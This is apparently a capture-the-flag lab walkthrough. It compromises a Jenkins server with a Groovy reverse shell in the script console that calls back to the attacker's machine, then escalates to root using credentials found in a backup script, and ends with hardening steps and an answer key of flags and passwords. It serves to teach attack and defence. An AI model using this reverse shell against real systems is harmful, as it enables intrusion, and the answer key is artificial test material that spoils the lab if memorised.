# Day_12 [Defense-In-Depth] Sleighing Threats, One Layer at a Time

+ Deployable Machine: Yes
+ SSH: Yes
  + UN: admin
  + PW: SuperStrongPassword123

Description: With the chaos of the recent merger, the company's security landscape has turned into the Wild West. Servers and endpoints, once considered fortresses, now resemble neglected outposts on the frontier, vulnerable to any attacker. As McHoneyBell sifts through the reports, a sense of urgency gnaws at her. "This is a ticking time bomb," she mutters to herself. It's clear they need a strategy, and fast. Determined, McHoneyBell rises from her chair, her mind racing with possibilities. "Time to suit up, team. We're going deep!" she declares, her tone a blend of resolve and excitement. "Defence in Depth isn't just a strategy; it's our lifeline. We're going to fortify every layer, from the physical servers in the basement to the cloud floating above us. Every byte, every bit." In this task, we will be hopping into McHoneyBell's shoes and exploring how the defence in depth strategy can help strengthen the environment's overall security posture.

> IP: [10.10.164.112]

## LEARNING OBJECTIVES

1. Defence in Depth
2. Basic Endpoint Hardening
3. Simple Boot2Root Methodology

## OVERVIEW

## STEPS

1. Deploy Machine
2. Navigate to website on port 8080
   1. [http://10.10.164.112:8080]
   2. Going here we see that the site is a jenkins dashboard
   3. WEBSHELL
      1. Go to Manage Jenkins -> Script console
      2. Create a revshell

         ```bash
            String host="attacking machine IP here";
            int port=6996;
            String cmd="/bin/bash";
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
         ```

      3. Set up netcat listener
         1. > nc -lnvp 6996
         2. SUCCESS!
3. SSH into machine
   1. > ssh admin@10.10.164.112
4. ENUMERATION
   1. Looking through we see a backup.sh file in /opt/scripts
   2. Lets take a look at the script

      ```bash
         #!/bin/sh

         mkdir /var/lib/jenkins/backup
         mkdir /var/lib/jenkins/backup/jobs /var/lib/jenkins/backup/nodes /var/lib/jenkins/backup/plugins /var/lib/jenkins/backup/secrets /var/lib/jenkins/backup/users

         cp /var/lib/jenkins/*.xml /var/lib/jenkins/backup/
         cp -r /var/lib/jenkins/jobs/ /var/lib/jenkins/backup/jobs/
         cp -r /var/lib/jenkins/nodes/ /var/lib/jenkins/backup/nodes/
         cp /var/lib/jenkins/plugins/*.jpi /var/lib/jenkins/backup/plugins/
         cp /var/lib/jenkins/secrets/* /var/lib/jenkins/backup/secrets/
         cp -r /var/lib/jenkins/users/* /var/lib/jenkins/backup/users/

         tar czvf /var/lib/jenkins/backup.tar.gz /var/lib/jenkins/backup/
         /bin/sleep 5

         username="tracy"
         password="13_1n_33"
         Ip="localhost"
         sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz $username@$Ip:/home/tracy/backups
         /bin/sleep 10

         rm -rf /var/lib/jenkins/backup/
         rm -rf /var/lib/jenkins/backup.tar.gz
      ```

      1. In here we see a username = `tracy` and a password `13_1n_33`
5. SSH into machine (as tracy)
   1. > ssh tracy@10.10.164.112
      1. PW: 13_1n_33
6. ENUMERATION PART 2
   1. Check to see sudo privileges (if any)
      1. > sudo -l

         ```text
            Matching Defaults entries for tracy on jenkins:
               env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

            User tracy may run the following commands on jenkins:
               (ALL : ALL) ALL
         ```

         1. This tells us that tracy can run any command
   2. Since we can run anything as root lets switch to root
      1. > sudo su
   3. Get the root flag
      1. > cd /root
      2. > cat flag.txt
         1. FLAG: `ezRo0tW1thoutDiD`
7. DEFENSE HARDENING
   1. SUDO
      1. Remove Tracy from SUDO group
         1. > sudo deluser tracy sudo
      2. Check for confirmation
         3. > sudo -l -U tracy
      3. Now SSH back in as tracy and run "sudo -l"
         1. RESPONS: `Sorry, user tracy may not run sudo on jenkins.`
   2. SSH HARDENING
      1. We need to edit the "/etc/ssh/sshd_config" file
         1. > nano /etc/ssh/sshd_config
            1. Change "#PasswordAuthentication yes" -> "PasswordAuthentication no"
            2. Comment out "#Include /etc/ssh/sshd_config.d/*.conf"
            3. In here we also see `#Ne3d2SecureTh1sSecureSh31l`
            4. Restart ssh
               1. > systemctl restart ssh
   3. PASSWORD POLICY
   4. ZERO TRUST POLICY
      1. Navigate to Jenkins ome directory
         1. > cd /var/lib/jenkins
      2. Now lets take a look at the backup xml file
         1. > nano backup.xml.bak
            1. In here we see a section commented out

               ```xml
               <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizati>
                  <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
               </authorizationStrategy>
               <!--FullTrust_has_n0_Place1nS3cur1ty-->
               <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
                  <disableSignup>true</disableSignup>
                  <enableCaptcha>false</enableCaptcha>
               </securityRealm>
               ```

               1. Which looks to have a flag: `FullTrust_has_n0_Place1nS3cur1ty`
         2. Remove the comments
         3. Copy the backup xml as the new config.xml
         4. Restart jenkins
            1. > sudo systemctl restart jenkins
      3. Now navigate back to our jenkins website page
         1. Success! We are now met with a required login form!

## QUESTIONS

1. What is the default port for Jenkins?
   1. `8080`
2. What is the password of the user tracy?
   1. `13_1n_33`
3. What's the root flag?
   1. `ezRo0tW1thoutDiD`
4. What is the error message when you login as tracy again and try sudo -l after its removal from the sudoers group?
   1. `Sorry, user tracy may not run sudo on jenkins.`
5. What's the SSH flag?
   1. `#Ne3d2SecureTh1sSecureSh31l`
6. What's the Jenkins flag?
   1. `FullTrust_has_n0_Place1nS3cur1ty`